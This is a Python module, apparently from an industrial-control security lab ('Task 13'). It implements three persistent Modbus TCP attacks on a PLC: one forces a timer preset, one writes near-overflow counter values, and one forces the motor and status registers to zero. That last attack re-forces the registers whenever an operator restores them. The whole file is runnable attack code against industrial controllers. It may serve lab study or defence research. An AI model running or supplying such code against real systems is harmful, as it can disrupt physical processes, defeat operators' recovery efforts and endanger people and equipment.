"""
Persistent attack variants (Task 13).

Each attack runs in its own background thread and can be stopped on
demand. Attacks log through the central logger.

Attack 1 — Timer manipulation with persistence:
    Reapplies MW1 = 12000 every `interval` seconds.

Attack 2 — Counter overflow with random values:
    Writes a random value in [60000, 65535] to MW3 every `interval`.

Attack 3 — Flag manipulation with reinfection:
    Forces MW0 = 0 and MW4 = 0. If the PLC (or an operator) restores
    either register to a non-zero value, the attack detects this on
    the next poll and re-applies immediately — "automatic reinfection".
"""
import random
import threading
import time
from datetime import datetime

from pymodbus.client import ModbusTcpClient

from .logger import get_attack_logger

log = get_attack_logger("attack.variants")


# ---------------------------------------------------------------------------
# Modbus helpers (keyword args required by modern pymodbus)
# ---------------------------------------------------------------------------

def _connect(ip, port=502):
    c = ModbusTcpClient(ip, port=port)
    c.connect()
    if not c.connected:
        raise ConnectionError(f"Cannot reach PLC at {ip}:{port}")
    return c


def _read(c, addr):
    return c.read_holding_registers(address=addr, count=1).registers[0]


def _write(c, addr, value):
    c.write_register(address=addr, value=value)


# ---------------------------------------------------------------------------
# Base class
# ---------------------------------------------------------------------------

class PersistentAttack:
    """Base class for a persistent (looping) attack."""

    name = "generic"
    interval = 60.0

    def __init__(self, plc_ip, interval=None, modbus_port=502):
        self.plc_ip = plc_ip
        self.modbus_port = modbus_port
        if interval is not None:
            self.interval = interval
        self._stop = threading.Event()
        self._thread = None
        self._rounds = 0

    # --- Lifecycle ---------------------------------------------------------

    def start(self):
        if self._thread and self._thread.is_alive():
            log.warning(f"{self.name}: already running")
            return False
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        log.info(f"{self.name}: STARTED (interval={self.interval}s)")
        return True

    def stop(self):
        if not self._thread:
            return False
        self._stop.set()
        self._thread.join(timeout=5)
        log.info(f"{self.name}: STOPPED after {self._rounds} rounds")
        return True

    def is_running(self):
        return bool(self._thread and self._thread.is_alive())

    # --- Main loop ---------------------------------------------------------

    def _run(self):
        while not self._stop.is_set():
            self._rounds += 1
            try:
                self.apply()
            except Exception as e:
                log.error(f"{self.name}: round {self._rounds} failed: {e}")
            self._stop.wait(self.interval)

    def apply(self):
        """Override in subclass. Called every `interval` seconds."""
        raise NotImplementedError


# ---------------------------------------------------------------------------
# Attack 1 — Persistent timer manipulation
# ---------------------------------------------------------------------------

class TimerAttack(PersistentAttack):
    """MW1 (T1 preset) forced to 12000 ms and reapplied every interval."""

    name = "attack.timer"
    interval = 60.0
    REG = 1
    VALUE = 12000

    def apply(self):
        c = _connect(self.plc_ip, self.modbus_port)
        try:
            old = _read(c, self.REG)
            _write(c, self.REG, self.VALUE)
            log.info(
                f"timer: MW{self.REG} {old} -> {self.VALUE} "
                f"(round {self._rounds})"
            )
        finally:
            c.close()


# ---------------------------------------------------------------------------
# Attack 2 — Counter overflow with random values
# ---------------------------------------------------------------------------

class CounterAttack(PersistentAttack):
    """MW3 (C1 count) set to a random value between 60000 and 65535."""

    name = "attack.counter"
    interval = 60.0
    REG = 3
    MIN = 60000
    MAX = 65535

    def apply(self):
        c = _connect(self.plc_ip, self.modbus_port)
        try:
            old = _read(c, self.REG)
            value = random.randint(self.MIN, self.MAX)
            _write(c, self.REG, value)
            log.info(
                f"counter: MW{self.REG} {old} -> {value} "
                f"(round {self._rounds})"
            )
        finally:
            c.close()


# ---------------------------------------------------------------------------
# Attack 3 — Flag manipulation with automatic reinfection
# ---------------------------------------------------------------------------

class FlagAttack(PersistentAttack):
    """
    Forces MW0 (motor) = 0 and MW4 (status) = 0.

    Detects restoration: if the register no longer holds the attack value,
    the attack logs a REINFECTION event and immediately re-applies.
    """

    name = "attack.flag"
    interval = 10.0           # poll faster than the others
    REGS = [(0, 0), (4, 0)]   # [(register, attack_value), ...]

    def apply(self):
        c = _connect(self.plc_ip, self.modbus_port)
        try:
            for reg, attack_value in self.REGS:
                current = _read(c, reg)
                if current != attack_value:
                    log.warning(
                        f"flag: REINFECTION on MW{reg} "
                        f"(was {current}, forcing {attack_value})"
                    )
                    _write(c, reg, attack_value)
                elif self._rounds == 1:
                    log.info(
                        f"flag: initial corruption MW{reg} = {attack_value}"
                    )
        finally:
            c.close()


# ---------------------------------------------------------------------------
# Registry — for API / orchestrator
# ---------------------------------------------------------------------------

ATTACK_REGISTRY = {
    "timer":   TimerAttack,
    "counter": CounterAttack,
    "flag":    FlagAttack,
}


def get_attack_class(name: str):
    cls = ATTACK_REGISTRY.get(name)
    if cls is None:
        raise ValueError(f"Unknown attack: {name}")
    return cls